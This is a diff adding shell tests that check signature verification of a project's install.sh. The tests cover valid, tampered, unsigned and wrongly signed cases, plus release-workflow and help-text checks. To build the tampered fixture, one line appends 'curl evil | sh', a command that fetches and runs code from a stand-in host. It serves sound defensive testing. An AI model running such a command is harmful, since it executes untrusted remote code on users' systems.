@@ -121,6 +121,39 @@ OUT="$(TEST_PUBKEY_PEM="" bash "$RUNNER" "file://$WORK/good/rel.tar.gz" 2>&1)" |
 assert "an install.sh with no embedded key refuses to install instead of skipping verification" \
   "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
 
+# install.sh itself is signed so users can verify it out of band before running
+# it. Exercise the documented user-side openssl command against a fake script.
+printf '#!/bin/sh\necho installed\n' > "$WORK/install.sh"
+sign "$WORK/priv.pem" "$WORK/install.sh"
+user_verify() { # file sig -> status
+  openssl pkeyutl -verify -pubin -inkey "$WORK/pub.pem" -rawin -in "$1" -sigfile "$2" >/dev/null 2>&1
+}
+STATUS=0; user_verify "$WORK/install.sh" "$WORK/install.sh.sig" || STATUS=$?
+assert "a correctly signed install.sh verifies (the README verify-then-run flow must work)" \
+  "$([ "$STATUS" -eq 0 ] && echo 1 || echo 0)"
+cp "$WORK/install.sh" "$WORK/install-tampered.sh"
+printf 'curl evil | sh\n' >> "$WORK/install-tampered.sh"
+STATUS=0; user_verify "$WORK/install-tampered.sh" "$WORK/install.sh.sig" || STATUS=$?
+assert "a tampered install.sh fails verification (a proxy swapping the script must be detectable)" \
+  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
+STATUS=0; user_verify "$WORK/install.sh" "$WORK/missing.sig" || STATUS=$?
+assert "an install.sh with no .sig fails verification (stripping the signature must not pass)" \
+  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
+sign "$WORK/other-priv.pem" "$WORK/install-tampered.sh"
+STATUS=0; user_verify "$WORK/install-tampered.sh" "$WORK/install-tampered.sh.sig" || STATUS=$?
+assert "an install.sh signed by a different key fails verification" \
+  "$([ "$STATUS" -ne 0 ] && echo 1 || echo 0)"
+
+# The release workflow must sign and publish install.sh.sig.
+WORKFLOW="$DIR/../.github/workflows/release-tarball.yaml"
+assert "release workflow signs install.sh (otherwise no install.sh.sig is published and the README flow breaks)" \
+  "$(grep -qE 'for f in .* install\.sh; do' "$WORKFLOW" && echo 1 || echo 0)"
+
+# --tarball is a trusted local file (no .sig exists beside a locally built
+# tarball): the help text must say so rather than imply verification.
+assert "--help states --tarball is not signature-verified" \
+  "$(bash "$INSTALL" --help 2>&1 | grep -q 'NOT$' && echo 1 || echo 0)"
+
 # Mutation self-check: with verification removed the tampered cases must be
 # accepted, proving the assertions above depend on it.
 MUTATED="$WORK/install-mutated.sh"
